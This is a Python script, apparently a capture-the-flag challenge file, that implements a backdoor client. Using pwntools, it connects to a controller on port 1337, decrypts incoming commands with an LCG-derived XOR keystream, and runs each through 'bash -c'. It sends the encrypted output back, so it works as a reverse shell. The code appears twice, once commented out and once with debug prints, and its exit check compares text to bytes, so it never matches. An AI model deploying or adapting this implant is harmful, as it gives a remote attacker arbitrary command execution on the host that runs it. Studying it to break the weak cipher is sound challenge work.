# from pwn import *
# from params import *
# from secret import SEED
# from base64 import b64decode as bd, b64encode as be
# import json, subprocess

# class LCG:
#     def __init__(self):
#         self.state = SEED
#         self.a = a
#         self.b = b
#         self.m = m
    
#     def _next(self):
#         self.state = (self.a * self.state + self.b) % self.m
#         return self.state
    
#     def generate_key(self, l):
#         return bytes([self._next() & 0xff for _ in range(l)])

#     def generate_packet_uuid(self):
#         return hex(self._next())

#     def encrypt(self, msg):
#         key = self.generate_key(len(msg))
#         return xor(msg, key)

#     def decrypt(self, msg):
#         return self.encrypt(msg)

# # r = remote('192.168.64.1', 1337)
# r = remote('127.0.0.1', 1337)


# lcg = LCG()

# while True:
#     data = json.loads(r.recvline())
#     enc_cmd = bd(data['cmd'].encode())
#     init = data['init']
    
#     cmd = lcg.decrypt(enc_cmd).decode()

#     if init:
#         lcg.generate_packet_uuid()
#     else:
#         init = True
    
#     if cmd == b'exit':
#         r.close()
#         break
#     try:
#         out = subprocess.check_output(['bash', '-c', cmd])
#         enc_out = lcg.encrypt(out)
#         r.sendline(be(enc_out))
#     except:
#         break

#     r.clean()


from pwn import *
from params import *
from secret import SEED
from base64 import b64decode as bd, b64encode as be
import json, subprocess

class LCG:
    def __init__(self):
        self.state = SEED
        self.a = a
        self.b = b
        self.m = m
    
    def _next(self):
        self.state = (self.a * self.state + self.b) % self.m
        return self.state
    
    def generate_key(self, l):
        return bytes([self._next() & 0xff for _ in range(l)])

    def generate_packet_uuid(self):
        return hex(self._next())

    def encrypt(self, msg):
        key = self.generate_key(len(msg))
        return xor(msg, key)

    def decrypt(self, msg):
        return self.encrypt(msg)

# r = remote('192.168.64.1', 1337)
r = remote('127.0.0.1', 1337)

lcg = LCG()

while True:
    try:
        # Receive data from the server
        data = r.recvline()
        print(f"[DEBUG] Raw data received from server: {data}")  # Debug received data
        
        data = json.loads(data)  # Parse the JSON
        print(f"[DEBUG] Parsed JSON data: {data}")  # Debug the parsed data

        enc_cmd = bd(data['cmd'].encode())  # Base64 decode the encrypted command
        init = data['init']
        
        print(f"[DEBUG] Encrypted command: {enc_cmd}")  # Debug the encrypted command
        
        # Decrypt the command
        cmd = lcg.decrypt(enc_cmd).decode()
        print(f"[DEBUG] Decrypted command: {cmd}")  # Debug the decrypted command

        if init:
            lcg.generate_packet_uuid()
        else:
            init = True
        
        # Exit condition
        if cmd == b'exit':
            print("[DEBUG] Exit command received. Closing connection.")  # Debug exit condition
            r.close()
            break

        # Execute the command on the local system
        try:
            out = subprocess.check_output(['bash', '-c', cmd])
            print(f"[DEBUG] Command output: {out}")  # Debug the raw command output
            
            # Encrypt the output before sending it back to the server
            enc_out = lcg.encrypt(out)
            print(f"[DEBUG] Encrypted output: {enc_out}")  # Debug the encrypted output
            
            # Send the encrypted output back to the server
            r.sendline(be(enc_out))  
            print("[DEBUG] Encrypted output sent back to server.")  # Debug send action
            
        except Exception as e:
            print(f"[ERROR] Error executing command: {e}")  # Debug error during command execution
            break
        
        # Clean up the connection
        r.clean()
        print("[DEBUG] Connection cleaned.")  # Debug clean-up step
    
    except Exception as e:
        print(f"[ERROR] An error occurred: {e}")  # Debug catch-all exception handling
        break
